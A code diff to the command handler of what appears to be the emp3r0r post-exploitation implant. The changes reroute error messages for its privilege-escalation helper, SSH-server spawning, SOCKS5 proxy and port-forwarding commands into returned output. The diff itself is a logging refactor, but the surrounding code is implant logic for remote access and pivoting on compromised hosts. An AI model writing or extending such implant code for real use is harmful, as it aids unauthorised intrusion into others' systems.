@@ -75,8 +75,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// LPE helper
 		// !lpe script_name
 		if len(cmdSlice) < 2 {
-			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %s", cmdSlice)
+			log.Printf(out)
 			return
 		}
 
@@ -89,24 +89,24 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// !sshd id shell port args
 		log.Printf("Got sshd request: %s", cmdSlice)
 		if len(cmdSlice) < 3 {
-			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %s", cmdSlice)
+			log.Print(out)
 			return
 		}
 		shell := cmdSlice[1]
 		port := cmdSlice[2]
 		args := cmdSlice[3:]
 		go func() {
+			out = "success"
 			err = SSHD(shell, port, args)
 			if err != nil {
-				log.Printf("Failed to start SSHD: %v", err)
+				out = fmt.Sprintf("SSHD: %v", err)
 			}
 		}()
-		out = "success"
 		for !tun.IsPortOpen("127.0.0.1", port) {
 			time.Sleep(100 * time.Millisecond)
 			if err != nil {
-				out = fmt.Sprintf("sshd failed to start: %v", err)
+				out = fmt.Sprintf("sshd failed to start: %v\n%s", err, out)
 				break
 			}
 		}
@@ -115,15 +115,15 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// proxy server
 	case emp3r0r_data.C2CmdProxy:
 		if len(cmdSlice) != 3 {
-			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %v", cmdSlice)
+			log.Print(out)
 			return
 		}
 		log.Printf("Got proxy request: %s", cmdSlice)
 		addr := cmdSlice[2]
 		err = Socks5Proxy(cmdSlice[1], addr)
 		if err != nil {
-			log.Printf("Failed to start Socks5Proxy: %v", err)
+			out = fmt.Sprintf("Failed to start Socks5Proxy: %v", err)
 		}
 		return
 
@@ -131,26 +131,27 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// cmd format: !port_fwd [to/listen] [shID] [operation]
 	case emp3r0r_data.C2CmdPortFwd:
 		if len(cmdSlice) != 4 {
-			log.Printf("Invalid command: %v", cmdSlice)
+			out = fmt.Sprintf("Invalid command: %v", cmdSlice)
 			return
 		}
+		out = "success"
 		switch cmdSlice[3] {
 		case "stop":
 			sessionID := cmdSlice[1]
 			pf, exist := PortFwds[sessionID]
 			if exist {
 				pf.Cancel()
-				log.Printf("port mapping %s stopped", pf.Addr)
+				out = fmt.Sprintf("port mapping %s stopped", pf.Addr)
 				break
 			}
-			log.Printf("port mapping %s not found", pf.Addr)
+			out = fmt.Sprintf("port mapping %s not found", pf.Addr)
 		case "reverse":
 			go func() {
 				addr := cmdSlice[1]
 				sessionID := cmdSlice[2]
 				err = PortFwd(addr, sessionID, true)
 				if err != nil {
-					log.Printf("PortFwd (reverse) failed: %v", err)
+					out = fmt.Sprintf("PortFwd (reverse) failed: %v", err)
 				}
 			}()
 		case "on":
@@ -159,7 +160,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 				sessionID := cmdSlice[2]
 				err = PortFwd(to, sessionID, false)
 				if err != nil {
-					log.Printf("PortFwd failed: %v", err)
+					out = fmt.Sprintf("PortFwd failed: %v", err)
 				}
 			}()
 		default:
